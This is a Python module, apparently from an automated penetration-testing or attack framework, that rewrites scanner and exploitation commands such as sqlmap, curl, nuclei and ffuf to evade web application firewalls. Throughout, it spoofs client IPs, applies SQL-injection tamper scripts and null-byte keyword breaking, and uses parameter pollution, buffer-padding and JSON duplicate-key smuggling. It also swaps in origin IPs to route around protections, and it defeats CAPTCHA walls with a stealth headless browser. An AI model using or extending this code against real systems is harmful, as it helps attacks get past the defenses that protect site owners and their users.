"""
Active WAF ghost engine for traffic mutation.

This module transforms tool commands to inject stealth headers, spoof IPs,
and use other evasion techniques to bypass WAF and rate-limiting.
"""

from pathlib import Path
import json
import random
import re
from intelligence.waf_bypass.waf_attacker import WafAttacker

from utils.logger import get_logger

log = get_logger("waf_ghost_engine")


class WafGhostEngine:
    """Transforms commands to evade WAF detection using multi-tier mutations."""

    def __init__(self, remote_executor=None, rules: dict | None = None):
        self._ssh = remote_executor
        self._rules = rules or self._load_rules()
        self._request_counts: dict[str, int] = {}
        # Per (host:tool) block/allow tallies, fed by feedback() so the engine
        # can see which targets/tools are tripping the WAF.
        self._feedback_stats: dict[str, dict[str, int]] = {}

        self._user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        ]

    def _load_rules(self) -> dict:
        path = Path("rules/infrastructure.json")
        if not path.exists():
            return {}
        try:
            return json.loads(path.read_text(encoding="utf-8"))
        except Exception as e:
            import logging as __logging_tmp
            __logging_tmp.getLogger(__name__).error(
                f"Unhandled exception: {e}", exc_info=True)
            return {}

    def transform(self, command: str, tool: str, level: int = 1,
                  blocked_chars: list | None = None, force: bool = False) -> str:
        """
        Inject stealth headers and mutation into the command.

        Levels (adaptive — calibrated by observed block rate):
        1: Stealth Headers + Random UA (zero throttle)
        2: Encoding (Double URL, Unicode) + Payload Mutation + mild throttle
        3: Protocol Obfuscation (Chunked, HTTP/2) + Heavy Mutation + Keyword Breaking
        4: HPP + Buffer Padding Attacks

        The caller-provided `level` is treated as the *maximum* evasion tier.
        The actual effective level is computed from observed block rates via
        get_block_rate(), so the engine only throttles after real WAF blocks.
        """
        if not self._rules.get("waf_ghost_use_parasitism", True):
            return command

        transformed = command

        # ── Adaptive level calibration ──
        # Extract target domain to look up observed block rate
        _target_for_rate = None
        _rate_match = re.search(r'https?://([^/\"\'\'\s]+)', command)
        if _rate_match:
            _target_for_rate = _rate_match.group(1)

        if _target_for_rate:
            block_rate = self.get_block_rate(_target_for_rate, tool)
            # W6.4 / W6.7 — evasion ONLY when warranted. If this target/tool has
            # never been observed being blocked AND the caller did not explicitly
            # force evasion (a real block just happened), do NOT mutate at all.
            # Mutating a command with no WAF evidence is pure downside: it adds
            # noise and has repeatedly broken tools (e.g. comma-laden UA headers)
            # while a false-positive WAF detection can fire it. Evasion becomes
            # reactive: first request goes clean; if blocked, feedback() records
            # it and the retry escalates real evasion.
            if block_rate == 0.0 and not force:
                log.debug(
                    f"Ghost Protocol: no observed blocks for {tool}@{_target_for_rate} "
                    "and not forced — skipping mutation (reactive evasion).")
                return command
            if block_rate == 0.0:
                # Forced (a block just happened on a fresh engine) — minimum evasion
                effective_level = max(min(level, 2), 1)
            elif block_rate < 0.3:
                # Some blocks — mild evasion
                effective_level = min(level, 2)
            else:
                # Heavy blocking — use requested level
                effective_level = level
            if effective_level != level:
                log.info(
                    f"Ghost Protocol: Adaptive calibration for {tool}@{_target_for_rate}: "
                    f"requested level {level} -> effective {effective_level} (block_rate={block_rate:.2f})")
            level = effective_level

        # Raw-socket tools operate at TCP/TLS level — HTTP header evasion is
        # meaningless
        _RAW_SOCKET_TOOLS = {"sslscan", "nmap", "masscan", "dig", "naabu"}
        if tool in _RAW_SOCKET_TOOLS:
            log.info(
                f"Ghost Protocol: Skipping header evasion for raw-socket tool '{tool}'")
            return command

        target_domain = None
        target_match = re.search(r'https?://([^/\"\'\s]+)', command)
        if target_match:
            target_domain = target_match.group(1)

        headers = self._generate_stealth_headers(target_domain)

        # Origin IP Swapping (WafBypassOrchestrator Integration)
        try:
            from intelligence.waf_bypass_orchestrator import WafBypassOrchestrator
            orchestrator = WafBypassOrchestrator()

            # Extract target from command for active strategy lookup
            if target_domain:
                active_strategy = orchestrator.get_active_strategy(
                    target_domain)

                if active_strategy.get(
                        "vector") == "origin" and "origin_ip" in active_strategy:
                    origin_ip = active_strategy["origin_ip"]
                    # Inject Host header for Origin Bypass
                    headers["Host"] = active_strategy.get(
                        "host_header", target_domain)
                    # Swap URL domain with IP
                    transformed = re.sub(
                        rf'https?://{re.escape(target_domain)}', f'http://{origin_ip}', transformed)
                    log.info(
                        f"Ghost Protocol: Origin Swapping active. Targeting {origin_ip} for {target_domain}")
        except Exception as e:
            log.error(
                f"Ghost Protocol: Failed to lookup active bypass strategy: {e}")

        # Phase 1: Header & Protocol Injection
        if "curl" in command:
            h_args = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
            if level >= 3:
                # Protocol obfuscation
                h_args += " --http2 --compressed -k -H \"Transfer-Encoding: chunked\""
                if "--limit-rate" not in transformed:
                    h_args += " --limit-rate 50k"  # Slow and steady Level 3
            transformed = transformed.replace("curl ", f"curl {h_args} ", 1)
            # W6.6a — TLS/JA3 evasion: at the protocol-obfuscation tier, present
            # a real browser handshake by rewriting curl onto a curl-impersonate
            # binary when one is installed (defeats JA3 fingerprinting that no
            # header spoofing can). Safe no-op when the tooling is absent.
            if level >= 3:
                try:
                    from intelligence.waf_bypass.tls_fingerprint import TlsFingerprintEvasion
                    tls = TlsFingerprintEvasion()
                    if tls.available:
                        transformed, _tls_note = tls.rewrite_curl_for_impersonation(transformed)
                        log.info(f"Ghost Protocol: {_tls_note}")
                except Exception as _tls_err:
                    log.debug(f"TLS impersonation rewrite skipped: {_tls_err}")

        elif "wget" in command:
            h_args = " ".join(
                [f'--header="{k}: {v}"' for k, v in headers.items()])
            transformed = transformed.replace("wget ", f"wget {h_args} ", 1)

        elif "sqlmap" in command:
            if "--random-agent" not in transformed:
                transformed += " --random-agent"
            if "--headers" not in transformed:
                h_str = ",".join([f"{k}:{v}" for k, v in headers.items()])
                transformed += f' --headers="{h_str}"'
            # FIX: Use elif to prevent double --tamper and --delay flags.
            # Level 3 overrides level 2, not appends on top.
            if level >= 3:
                if "--tamper" not in transformed:
                    transformed += " --tamper=apostrophemask,unionalltounion,versionedkeywords,between,randomcase,space2comment,charencode"
                if "--delay" not in transformed:
                    transformed += " --delay=3"
            elif level >= 2:
                if "--tamper" not in transformed:
                    transformed += " --tamper=between,randomcase,space2comment,charencode"
                if "--delay" not in transformed:
                    transformed += " --delay=1"

        elif "nuclei" in command:
            h_args = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
            if level >= 3:
                h_args += ' -H "Transfer-Encoding: chunked"'
            transformed = transformed.replace(
                "nuclei ", f"nuclei {h_args} ", 1)
            # FIX: elif to prevent duplicate rate-limit/bulk-size/concurrency flags
            if level >= 3:
                if "-rate-limit" not in transformed:
                    transformed += " -rate-limit 5"
                if "-bulk-size" not in transformed:
                    transformed += " -bulk-size 1"
                if "-concurrency" not in transformed:
                    transformed += " -concurrency 1"
                if "-no-interactsh" not in transformed:
                    transformed += " -no-interactsh"
            elif level >= 2:
                if "-rate-limit" not in transformed:
                    transformed += " -rate-limit 10"
                if "-bulk-size" not in transformed:
                    transformed += " -bulk-size 3"
                if "-concurrency" not in transformed:
                    transformed += " -concurrency 3"

        elif "ffuf" in command or "gobuster" in command:
            # Clean header values for fuzzers (like gobuster/ffuf) that parse commas as separators
            fuzzer_headers = {}
            for k, v in headers.items():
                # Strip commas from header values to prevent gobuster/ffuf parser splits
                clean_val = v.split(",")[0].strip() if "," in v else v
                fuzzer_headers[k] = clean_val

            if "ffuf" in command:
                # ffuf: use -H for all headers including User-Agent
                h_args = " ".join(
                    [f'-H "{k}: {v}"' for k, v in fuzzer_headers.items()])
                if level >= 3:
                    h_args += ' -H "X-HTTP-Method-Override: GET"'
                transformed = transformed.replace(
                    "ffuf ", f"ffuf {h_args} ", 1)
            if "gobuster" in command:
                # gobuster: use -a for User-Agent
                gb_headers = dict(fuzzer_headers)  # copy to avoid mutating
                ua = gb_headers.pop("User-Agent", self._user_agents[0])
                extra_h = " ".join(
                    [f'-H "{k}: {v}"' for k, v in gb_headers.items()])
                gb_args = f'-a "{ua}" {extra_h}'
                if level >= 3:
                    gb_args += ' -H "X-HTTP-Method-Override: GET"'
                if "gobuster dir " in transformed:
                    transformed = transformed.replace(
                        "gobuster dir ", f"gobuster dir {gb_args} ", 1)
                elif "gobuster vhost " in transformed:
                    transformed = transformed.replace(
                        "gobuster vhost ", f"gobuster vhost {gb_args} ", 1)
                elif "gobuster dns " in transformed:
                    transformed = transformed.replace(
                        "gobuster dns ", f"gobuster dns {gb_args} ", 1)
                elif "gobuster fuzz " in transformed:
                    transformed = transformed.replace(
                        "gobuster fuzz ", f"gobuster fuzz {gb_args} ", 1)
                else:
                    # Default to dir mode if AI forgot to specify a mode
                    transformed = transformed.replace(
                        "gobuster ", f"gobuster dir {gb_args} ", 1)
            if level >= 3:
                if "ffuf" in command:
                    if "-p " not in transformed:
                        transformed += " -p 1.5-3.0"
                    if "-t " not in transformed and "--threads" not in transformed:
                        transformed += " -t 2"
                    transformed += " -H \"Connection: close\" -H \"Cache-Control: no-cache\""
                if "gobuster" in command:
                    if "--delay" not in transformed:
                        transformed += " --delay 5s"
                    # Only add threads if neither -t nor --threads already in
                    # command
                    if "-t " not in transformed and "--threads" not in transformed:
                        transformed += " --threads 1"
            elif level >= 2:
                # Add jitter and delay for fuzzing — guard against duplicate
                # flags
                if "ffuf" in command:
                    if "-p " not in transformed:
                        transformed += " -p 0.5-1.5"
                    if "-t " not in transformed and "--threads" not in transformed:
                        transformed += " -t 5"
                if "gobuster" in command:
                    if "--delay" not in transformed:
                        transformed += " --delay 2s"
                    # Only add threads if neither -t nor --threads already in
                    # command
                    if "-t " not in transformed and "--threads" not in transformed:
                        transformed += " --threads 2"

        elif "httpx" in command:
            h_args = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
            transformed = transformed.replace("httpx ", f"httpx {h_args} ", 1)
            if level >= 2:
                transformed += " -rl 10 -c 5 -timeout 15 -retries 3"  # slow down and retry
            if level >= 3:
                transformed += " -random-agent"

        elif "katana" in command:
            h_args = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
            transformed = transformed.replace(
                "katana ", f"katana {h_args} ", 1)
            if level >= 2:
                transformed += " -rl 10 -c 5"
            if level >= 3:
                transformed += " -random-agent"

        elif "dirsearch" in command:
            h_args = " ".join(
                [f'--header "{k}: {v}"' for k, v in headers.items()])
            transformed = transformed.replace(
                "dirsearch ", f"dirsearch {h_args} ", 1)
            # FIX: elif to prevent double --random-agent / --delay
            if level >= 3:
                if "--random-agent" not in transformed:
                    transformed += " --random-agent"
                if "-t " not in transformed:
                    transformed += " -t 2"
                if "--delay" not in transformed:
                    transformed += " --delay 3"
            elif level >= 2:
                if "--random-agent" not in transformed:
                    transformed += " --random-agent"
                if "-t " not in transformed:
                    transformed += " -t 5"
                if "--delay" not in transformed:
                    transformed += " --delay 1"

        elif "dalfox" in command:
            h_args = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])
            transformed = transformed.replace(
                "dalfox ", f"dalfox {h_args} ", 1)
            if level >= 2:
                transformed += " --delay 1000 -w 5"

        elif "naabu" in command:
            # FIX: elif to prevent double -rate-limit / -c
            if level >= 3:
                if "-rate-limit" not in transformed:
                    transformed += " -rate-limit 5"
                if "-c " not in transformed:
                    transformed += " -c 2"
            elif level >= 2:
                if "-rate-limit" not in transformed:
                    transformed += " -rate-limit 10"
                if "-c " not in transformed:
                    transformed += " -c 5"

        elif "nikto" in command:
            # nikto -evasion only accepts digits 1-8. Letters like 'A' cause help dump.
            # -evasion 1 = Random URI encoding (stealthy and effective)
            if level >= 2 and "-evasion" not in transformed:
                transformed += " -evasion 1 -Tuning 123"
            if level >= 3:
                # Nikto needs more time when running through WAFs
                if "-maxtime 60" in transformed:
                    transformed = transformed.replace(
                        "-maxtime 60", "-maxtime 180")

        elif "whatweb" in command:
            # whatweb's option parser treats commas as separators, so a
            # comma-laden User-Agent ("...(KHTML, like Gecko)...") injected via
            # --header makes it emit "Unknown option" / usage text. Strip commas
            # from header values here, exactly like the gobuster/ffuf branch.
            ww_headers = {
                k: (v.split(",")[0].strip() if "," in v else v)
                for k, v in headers.items()
            }
            h_args = " ".join(
                [f'--header "{k}: {v}"' for k, v in ww_headers.items()])
            transformed = transformed.replace(
                "whatweb ", f"whatweb {h_args} ", 1)
            if level >= 2:
                transformed += " --no-errors"

        # Phase 2: Payload Mutation (Level 2+)
        if level >= 2:
            transformed = self._mutate_payloads(
                transformed, blocked_chars, level)

        # Phase 3: Proxychains Injection & IP Rotation (Level 2+)
        # (Disabled logic removed)

        # Phase 4: Slow-Rate Behavioral Evasion (Level 4+)
        if level >= 4:
            # Inject extreme delays into fuzzers to bypass anomaly detection
            if "ffuf" in transformed:
                transformed = re.sub(r'-p\s+[\d.-]+', '', transformed)
                transformed += " -p 15.0-30.0"  # Ultra-slow rate
            elif "gobuster" in transformed:
                transformed = re.sub(r'--delay\s+[\ds]+', '', transformed)
                transformed += " --delay 15s"

        # W6.2 — shell-validity guard. A mutation that produces an
        # unparseable command (unbalanced quotes from an injected header value,
        # etc.) is worse than no mutation: it guarantees a failed run + a wasted
        # repair cycle. Validate the transformed command parses as a shell line;
        # if not, fall back to the original, untouched command.
        if transformed != command:
            try:
                import shlex as _shlex
                _shlex.split(transformed)
            except ValueError as _ve:
                log.warning(
                    f"Ghost Protocol: mutation for {tool} produced an unparseable "
                    f"command ({_ve}); falling back to the original command.")
                return command
            log.info(
                f"Ghost Protocol: Transformed {tool} command (Evasion Level {level}).")

        return transformed

    def _mutate_payloads(self, command: str, blocked_chars: list |
                         None = None, level: int = 2) -> str:
        """Apply advanced mutations to payloads within the command string."""
        blocked = blocked_chars or []

        # 1. SQLi Space Mutation (only if spaces are explicitly blocked)
        if " " in blocked:
            command = command.replace(" ", "/**/")

        # 2. SQLi Equality Mutation (only if equality operator is explicitly
        # blocked)
        if "=" in blocked:
            # Safely replace only in queries (or target payloads) rather than headers
            # To be simple and robust: only replace outside of header
            # definitions or just the whole command if requested
            command = command.replace("=", " LIKE ")

        # 3. Path Traversal Mutation
        if "../" in command and "/" in blocked:
            command = command.replace("../", "..\\")

        # 4. Keyword Breaking (Level 3+)
        if level >= 3:
            # Break common keywords that WAFs look for
            keywords = [
                "SELECT",
                "UNION",
                "ETC/PASSWD",
                "SCRIPT",
                "ALERT",
                "EVAL"]
            for kw in keywords:
                if kw in command.upper():
                    scrambled = "".join(
                        [c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw)])
                    if level >= 3:
                        scrambled = scrambled[0] + "%00" + scrambled[1:]
                    command = re.sub(
                        re.escape(kw),
                        scrambled,
                        command,
                        flags=re.IGNORECASE)

        # 5. Encoding
        parts = command.split(" ")
        for i, part in enumerate(parts):
            if part.startswith("'") or part.startswith("\"") or "http" in part:
                if "'" in blocked:
                    parts[i] = part.replace("'", "%27")
                if "\"" in blocked:
                    parts[i] = part.replace("\"", "%22")
                if level >= 3 and "http" in part:
                    parts[i] = part.replace("<", "%253c").replace(">", "%253e")

        command = " ".join(parts)

        # 6. JSON Smuggling & Boundary Evasion (Level 3+)
        if level >= 3:
            command = self._mutate_json_smuggling(command)
            command = self._mutate_multipart_boundary(command)

        # 7. Advanced WAF Direct Attacks (Level 4+)
        if level >= 4:
            attacker = WafAttacker()

            # HTTP Parameter Pollution (HPP)
            # Find basic GET parameters and pollute them
            if "?" in command and "=" in command:
                # Naive regex to find a single param=value to pollute
                match = re.search(r'\?([a-zA-Z0-9_]+)=([^\s\'"]+)', command)
                if match:
                    param = match.group(1)
                    val = match.group(2)
                    polluted = attacker.generate_hpp_params(param, val)
                    command = command.replace(
                        f"?{param}={val}", f"?{polluted}")

            # Payload Padding for POST requests (Buffer Exhaustion)
            if "curl " in command and "-d " in command:
                # Find the data block
                data_match = re.search(r'-d\s+[\'"](.*?)[\'"]', command)
                if data_match:
                    original_data = data_match.group(1)
                    # Prepend 128KB of junk to push actual payload past WAF
                    # buffer
                    padding = attacker.generate_padding(size_kb=128)
                    padded_data = f"padding={padding}&{original_data}"
                    command = command.replace(
                        f"-d '{original_data}'", f"-d '{padded_data}'").replace(
                        f'-d "{original_data}"', f'-d "{padded_data}"')
            elif "sqlmap " in command:
                # Add tamper scripts for HPP and padding if level is very high
                if "--tamper" not in command:
                    command += " --tamper=hpp,between"

        return command

    def _mutate_json_smuggling(self, command: str) -> str:
        """
        Exploits JSON parser differentials (WAFFLED).
        Mutates JSON payloads in curl commands to include duplicate keys or malformed unicode whitespace.
        WAFs often parse the first key (or drop on whitespace), while the backend parses the last key.
        """
        # Look for JSON payload in curl: -d '{"username":"admin"}'
        if "curl" not in command or "-d" not in command:
            return command

        json_match = re.search(r'-d\s+[\'"](\{.*?\})[\'"]', command)
        if not json_match:
            return command

        json_str = json_match.group(1)

        try:
            # Parse the JSON if it's well-formed
            data = json.loads(json_str)
            if not isinstance(data, dict) or not data:
                return command

            # Pick a random key to duplicate
            target_key = random.choice(list(data.keys()))

            # WAFFLED Technique 1: Duplicate Key Smuggling
            # {"key":"benign", "key":"malicious"}
            # The WAF sees "benign", the backend sees "malicious"
            smuggled_json_str = json_str.replace(
                f'"{target_key}"',
                f'"{target_key}":"bypass_test_string",\\u0000"{target_key}"',
                1
            )

            return command.replace(json_str, smuggled_json_str)
        except json.JSONDecodeError:
            return command

    def _mutate_multipart_boundary(self, command: str) -> str:
        """
        Exploits Multipart Boundary Evasion.
        Mutates the boundary string so the WAF fails to parse the POST body,
        but the backend server (which is often more lenient) still parses it.
        """
        if "curl" not in command or "multipart/form-data" not in command:
            return command

        # If curl is auto-generating the boundary with -F, we force a custom
        # malformed one
        if "-F" in command and "boundary=" not in command:
            # Inject a malformed boundary into the header
            malformed_boundary = "----WebKitFormBoundary" + \
                "".join(random.choices("0123456789abcdef", k=16)) + " \t"
            header_inject = f'-H "Content-Type: multipart/form-data; boundary={malformed_boundary}"'
            command = command.replace("curl", f"curl {header_inject}", 1)

        return command

    def _generate_stealth_headers(self, target_domain: str = None) -> dict:
        """Generate a set of spoofed headers."""
        fake_ip = ".".join(map(str, (random.randint(1, 254)
                           for _ in range(4))))

        # Use UA from rules if available
        ua_list = self._rules.get("waf_evasion_user_agents", self._user_agents)
        headers = {
            "User-Agent": random.choice(ua_list),
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "Accept-Language": "en-US",
            "Referer": "https://www.google.com/",
        }

        # Add extra headers from rules (randomly pick 1-3 extra headers)
        extra_options = self._rules.get("waf_evasion_extra_headers", [])
        if extra_options:
            num_extra = random.randint(1, min(3, len(extra_options)))
            selected_extras = random.sample(extra_options, num_extra)
            for extra in selected_extras:
                for k, v in extra.items():
                    # Replace 127.0.0.1 or localhost with appropriate values
                    if v == "127.0.0.1":
                        headers[k] = fake_ip
                    elif v == "localhost":
                        # Try to use a domain name if we have one, otherwise
                        # use fake_ip or localhost
                        headers[k] = target_domain if target_domain else "localhost"
                    else:
                        headers[k] = v

        return headers

    def feedback(self, host: str, tool: str, blocked: bool) -> None:
        """Record whether a (mutated) request to (host, tool) was WAF-blocked.

        Agents call this on every tool success/block so the engine accumulates a
        per-target/per-tool picture of what trips the WAF. Best-effort; never raises.
        """
        try:
            key = f"{host}:{tool}"
            stat = self._feedback_stats.setdefault(
                key, {"blocked": 0, "allowed": 0})
            stat["blocked" if blocked else "allowed"] += 1
        except Exception:
            pass

    def get_block_rate(self, host: str, tool: str) -> float:
        """Return the observed block rate for (host, tool), or 0.0 if unseen."""
        stat = self._feedback_stats.get(f"{host}:{tool}")
        if not stat:
            return 0.0
        total = stat["blocked"] + stat["allowed"]
        return stat["blocked"] / total if total else 0.0

    def is_ready(self) -> bool:
        return True

    def solve_challenge(self, command: str) -> str | None:
        """
        Active challenge bypass using a headless browser to solve CAPTCHA/JS walls.
        Extracts clearance cookies and injects them into the original command.
        """
        urls = re.findall(r'https?://[^\s\'"]+', command)
        if not urls:
            return command

        target_url = urls[0]
        log.info(f"Ghost Protocol: Launching headless solver for {target_url}")

        if not self._ssh:
            log.warning(
                "Ghost Protocol: No SSH executor available for remote challenge solving.")
            return command

        target_url_json = json.dumps(target_url)

        solver_script = f"""
import time
import json
import shutil
try:
    from playwright.sync_api import sync_playwright
    with sync_playwright() as p:
        # Fallback logic for finding system chromium if playwright native browser fails
        executable_path = None
        for browser_bin in ["chromium", "chromium-browser", "google-chrome", "/snap/bin/chromium"]:
            path = shutil.which(browser_bin)
            if path:
                executable_path = path
                break

        browser = p.chromium.launch(
            headless=True,
            executable_path=executable_path,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
                "--window-position=0,0",
                "--ignore-certificate-errors",
                "--ignore-certificate-errors-spki-list",
            ]
        )
        context = browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            viewport={{"width": 1920, "height": 1080}}
        )
        page = context.new_page()

        # Anti-detection scripts
        page.add_init_script("Object.defineProperty(navigator, 'webdriver', {{get: () => undefined}})")

        page.goto({target_url_json}, wait_until='networkidle', timeout=90000)
        page.wait_for_timeout(5000)  # Allow JS challenges to execute
        cookies = context.cookies()
        cookie_str = "; ".join([f"{{c['name']}}={{c['value']}}" for c in cookies])
        print(f"__SOLVED_COOKIES__={{cookie_str}}")
        browser.close()
except ImportError:
    print("__PLAYWRIGHT_MISSING__")
except Exception as e:
    print(f"__SOLVER_ERROR__: {{e}}")
"""
        # Upload and execute the solver script
        script_path = f"/tmp/waf_solver_{random.randint(1000, 9999)}.py"
        self._ssh.upload_content(solver_script.strip(), script_path)

        exit_code, stdout, stderr = self._ssh.execute(
            f"python3 {script_path}", timeout=120)
        self._ssh.execute(f"rm -f {script_path}")

        # Safely extract cookies with safe_marker_extraction (never crashes
        # with IndexError)
        from core.result_contracts import FragileParseFixer

        cookie_str = FragileParseFixer.safe_marker_extraction(
            stdout,
            marker_start="__SOLVED_COOKIES__=",
            marker_end="\n",
            default=""
        )

        if cookie_str:
            log.info(
                f"Ghost Protocol: Challenge solved successfully. Injected cookies: {cookie_str[:30]}...")
            # Inject cookie into command
            if "curl " in command:
                return command.replace("curl ", f"curl -b '{cookie_str}' ", 1)
            elif "wget " in command:
                return command.replace(
                    "wget ", f"wget --header='Cookie: {cookie_str}' ", 1)
            elif "sqlmap " in command:
                return command + f" --cookie='{cookie_str}'"
            elif "ffuf " in command or "gobuster " in command:
                tool_bin = command.split()[0]
                return command.replace(
                    tool_bin, f"{tool_bin} -H 'Cookie: {cookie_str}' ", 1)

        log.warning(
            f"Ghost Protocol: Challenge solver failed or timed out. stdout: {stdout}, stderr: {stderr}")
        return command
